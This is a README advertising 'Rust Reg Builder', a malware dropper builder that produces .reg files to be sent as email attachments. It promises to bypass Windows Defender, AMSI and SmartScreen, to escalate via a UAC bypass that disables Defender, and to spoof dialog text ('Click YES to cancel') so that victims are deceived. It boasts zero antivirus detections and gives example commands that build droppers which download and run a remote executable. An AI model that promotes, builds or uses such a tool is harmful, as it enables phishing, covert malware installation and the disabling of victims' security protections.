## Rust Reg Builder


## What Features does it has?

### ✔️Gmail attachment
Can be directly attached and sent by Gmail.
### ✔️ Outlook attachment
Can be archived and then attached and sent by Outlook
### ✔️ Guaranteed Windows Defender Bypass
Forget about issues with Defender.
It bypasses AMSI and SmartScreen too.
### ✔️ UAC Bypass Exploit
Reliable UAC bypass will escalate to Administrator and disables Windows Defender
### ✔️ Dialog Spoof
.reg popup window will display a custom message.
For example: "Click 'YES' to cancel." - check the video
### ✔️ Save Money on Crypters
This dropper will protect your file from being scanned by Defender.
Your crypts will last longer!


# Detections

0/30 at the time of publishing

https://www.virustotal.com/gui/file/fbeeef5c910124cb9caba7fafcca2a807832f2baa56b3efea3c2ef3169a78f43?nocache=1


# Usage

rust-reg-builder.exe <direct_link> <output> </dialog_spoof_msg> </trashcode>

- Dialog spoof & Trashcode are optional

Both are recommended to enable
Trashcode is enabled by default

Example:

rust-reg-builder.exe http://1.1.1.1/a.exe out

rust-reg-builder.exe http://1.1.1.1/a.exe out "Press YES to cancel" true


